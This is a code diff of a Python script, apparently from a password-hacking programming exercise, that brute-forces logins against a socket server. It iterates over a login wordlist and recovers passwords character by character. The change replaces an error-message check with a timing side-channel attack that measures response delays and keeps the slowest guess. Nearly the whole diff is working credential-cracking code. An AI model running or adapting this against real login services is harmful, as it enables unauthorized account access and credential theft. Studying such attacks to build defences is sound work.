@@ -1,6 +1,7 @@
 import argparse
 import json
 import string
+from time import time
 
 char_list = list(string.ascii_letters + string.digits + string.punctuation)
 
@@ -18,24 +19,30 @@ def find_login(client_socket, chunk_size, path):
         for login in file:
             login = login.strip('\n')
             json_login = {'login': login, 'password': ''}
-            guessed_password: str = ''
             char_index = 0
-            while True:
+            guessed_password: str = ''
+            time_delays = {}
+            while char_index < len(char_list):
                 password = guessed_password
                 password += char_list[char_index]
                 char_index += 1
                 json_login['password'] = password
                 message = json.dumps(json_login, indent=4)
+                start = time()
                 try:
                     client_socket.send(message.encode('utf-8'))
                     response = client_socket.recv(chunk_size).decode('utf-8')
                 except:
                     pass
+                end = time()
                 returned_str = json.loads(response)
+                diff = end - start
+                time_delays[password] = diff
                 if returned_str['result'] == 'Wrong login!':
                     break
-                elif returned_str['result'] == 'Exception happened during login':
-                    guessed_password = password
+                elif char_index == len(char_list):
+                    sorted_dict = dict(sorted(time_delays.items(), key=lambda item: item[1]))
+                    guessed_password = list(sorted_dict)[-1]
                     char_index = 0
                 elif returned_str['result'] == 'Connection success!':
                     return json_login
